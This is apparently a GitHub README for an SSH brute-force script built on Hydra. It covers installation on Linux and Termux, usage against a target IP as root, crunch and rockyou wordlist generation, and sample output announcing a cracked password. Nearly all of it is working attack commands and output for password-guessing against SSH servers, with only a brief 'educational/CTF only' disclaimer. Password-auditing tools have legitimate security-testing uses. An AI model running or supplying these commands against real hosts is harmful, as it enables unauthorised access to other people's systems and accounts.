# SSH Brute Force Tester 🔓

Quick SSH brute force script using Hydra. Auto-detects if target supports password auth before attacking.

## Install

```bash
# Ubuntu/Debian
sudo apt install hydra crunch -y

# Termux
pkg install hydra crunch -y

# Clone
git clone https://github.com/keinankairi-afk/ssh-brute.git
cd ssh-brute
chmod +x ssh-brute.sh
```

## Usage

```bash
./ssh-brute.sh <ip> <user> [wordlist] [port]
```

## Wordlists

| Wordlist | Passwords | Size | Time (est.) |
|----------|-----------|------|-------------|
| `all` (default) | 670 | 6KB | Detik |
| `crunch 6lower` | 308M | 2.1GB | ~1000 jam |
| `crunch 6alnum` | 2.1B | 15GB | ~7000 jam |
| rockyou.txt | 14M | 134MB | ~4000 jam |
| Custom | - | - | - |

## Examples

```bash
# Default — all built-in (670 passwords, detik)
./ssh-brute.sh 192.168.1.1 root

# Keyboard + name patterns
./ssh-brute.sh 192.168.1.1 root wordlist-keyboard.txt

# Crunch 6 lowercase (all 6-char combos)
./ssh-brute.sh 192.168.1.1 root "crunch 6lower"

# Crunch 6 alphanumeric (all 6-char combos)
./ssh-brute.sh 192.168.1.1 root "crunch 6alnum"

# Custom wordlist
./ssh-brute.sh 192.168.1.1 root /path/to/wordlist.txt

# Custom port
./ssh-brute.sh 192.168.1.1 root all 2222

# rockyou (download separately)
pkg install wordlists -y
./ssh-brute.sh 192.168.1.1 root /usr/share/wordlists/rockyou.txt
```

## Generate Custom Wordlists

```bash
# 6 digit PIN
crunch 6 6 0123456789 -o pin6.txt

# 8 char lowercase
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o 8lower.txt

# 8 char mixed
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o 8mixed.txt

# Custom charset
crunch 6 8 "abcdefghijklmnopqrstuvwxyz!@#$" -o custom.txt
```

## Output

```
=== SSH Brute Force Tester v2.3 ===
Target: 192.168.1.1:22
User:   root

[*] Using all built-in wordlists
[1/3] Checking password auth on port 22...
[+] Password auth supported!
[2/3] Wordlist: 670 passwords
       Estimated time: ~3min
[3/3] Starting brute force (timeout 300s)...

╔════════════════════════════════════════════╗
║  PASSWORD FOUND!                           ║
╚════════════════════════════════════════════╝
[FOUND] host: 192.168.1.1   login: root   password: admin123
[CMD]   ssh -p 22 root@192.168.1.1

=== Scan Complete ===
Log: /tmp/ssh-brute-20260619-190000.log
```

## Features

- ✅ Auto-detect password auth (skip if key-only)
- ✅ Multiple wordlists (built-in + crunch)
- ✅ Custom wordlist support
- ✅ Custom SSH port
- ✅ Auto-detect Termux (2 threads) vs desktop (4 threads)
- ✅ Time estimation
- ✅ Timeout protection (300s default)
- ✅ Log files (clean + raw)
- ✅ Works on Termux + Linux

## Notes

- Only works on targets with **password authentication enabled**
- Script auto-detects if target only accepts SSH keys (skips)
- Use responsibly — only test systems you own or have permission to test
- For educational/CTF purposes only

## License

MIT — use responsibly
